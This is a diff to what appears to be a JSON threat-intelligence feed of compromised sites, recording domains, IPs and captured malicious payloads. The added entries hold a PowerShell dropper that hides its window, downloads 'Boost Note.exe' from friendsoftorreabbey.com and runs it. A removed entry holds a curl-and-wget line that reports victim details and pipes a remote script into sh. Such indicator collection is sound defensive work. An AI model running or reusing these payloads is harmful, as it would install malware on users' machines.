@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "artisticmoderntiling.com.au",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "93.127.179.24"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwpwouox24kf0omlgh9z5stu",
+    "ScannedAt": "2026-11-21T04:26:46.330000+00:00"
+  },
+  {
+    "UrlDomain": "habercaglayancerit.xyz",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwpvtv3x24da0omlegqyi3w3",
+    "ScannedAt": "2026-11-21T04:02:40.528000+00:00"
+  },
+  {
     "UrlDomain": "aphonikaudio.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -9956,30 +9994,5 @@
     ],
     "ReportId": "cmwhdrkmr0skk0omlnjzy4s28",
     "ScannedAt": "2026-11-15T05:14:51.096000+00:00"
-  },
-  {
-    "UrlDomain": "conferenciahertz.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.156"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=69e0a4a8-9f08-4dce-8d93-b961c0037dfd&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fconferenciahertz[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T04%3A00%3A19.375Z&lastShellAt=2026-11-15T04%3A00%3A19.375Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwhb5rpu0ryt0omlc0rks6ff",
-    "ScannedAt": "2026-11-15T04:01:54.634000+00:00"
   }
 ]
